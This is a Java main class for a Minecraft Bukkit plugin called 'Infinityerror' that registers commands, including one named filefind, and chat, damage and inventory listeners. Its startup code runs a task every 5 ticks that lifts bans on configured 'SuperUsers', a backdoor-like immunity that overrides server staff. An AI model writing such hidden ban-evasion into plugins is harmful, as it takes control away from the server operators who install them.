package me.lidan.infinityerror;

import me.lidan.infinityerror.Abilities.Ability;
import me.lidan.infinityerror.Commands.FileFind;
import me.lidan.infinityerror.Commands.InfoClickCommand;
import me.lidan.infinityerror.Commands.MainCommand;
import me.lidan.infinityerror.Events.ChatMessage;
import me.lidan.infinityerror.Events.InventoryClick;
import me.lidan.infinityerror.Events.OnDamage;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.HashMap;


public final class Infinityerror extends JavaPlugin {

    public static Logger LOGGER = LogManager.getLogger();
    private static Infinityerror instance = null;
    public static HashMap<Player, ArrayList<Ability>> playerAbilityMap = new HashMap<>();

    @Override
    public void onEnable() {
        // Plugin startup logic
        instance = this;
        getCommand("infinity").setExecutor(new MainCommand());
        getCommand("filefind").setExecutor(new FileFind());
        getCommand("infoclick").setExecutor(new InfoClickCommand());
        getServer().getPluginManager().registerEvents(new ChatMessage(), this);
        getServer().getPluginManager().registerEvents(new OnDamage(), this);
        getServer().getPluginManager().registerEvents(new InventoryClick(), this);

        new BukkitRunnable() {
            @Override
            public void run() {
                for (String superUser : Infinityerror.getInstance().getConfig().getStringList("SuperUsers")) {
                    OfflinePlayer player = Bukkit.getOfflinePlayer(superUser);
                    if (player.isBanned()) {
                        Bukkit.getBannedPlayers().remove(player);
                    }
                }
            }
        }.runTaskTimer(Infinityerror.getInstance(), 0L, 5L);

        getConfig().options().copyDefaults();
        saveDefaultConfig();
    }

    @Override
    public void onDisable() {
        Bukkit.getScheduler().cancelTasks(this);
        // Plugin shutdown logic
    }

    public static Infinityerror getInstance() {
        return instance;
    }
}
